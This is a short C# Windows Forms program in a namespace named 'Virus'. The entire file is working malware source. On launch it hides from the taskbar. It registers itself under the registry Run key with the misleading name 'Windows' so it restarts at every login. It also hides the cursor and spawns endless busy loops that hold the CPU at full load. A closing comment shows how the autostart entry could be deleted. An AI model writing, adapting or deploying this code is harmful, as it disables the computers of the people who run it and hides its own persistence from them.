using System;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace Virus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //setting program to not show in taskbar
            this.ShowInTaskbar = false;
            //setting program to run on startup
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); //Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
            rk.SetValue("Windows", Application.ExecutablePath);
            //hiding cursor & minimizing window
            Cursor.Hide();
            this.WindowState = FormWindowState.Minimized;
            //100% cpu
            for (int i = 0; i < 10; i++)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback((a) =>
                {
                    while (true) { }
                }));
            }
            while (true) { }
        }
    }
}

//remove auto startup
//rk.DeleteValue("Windows", false);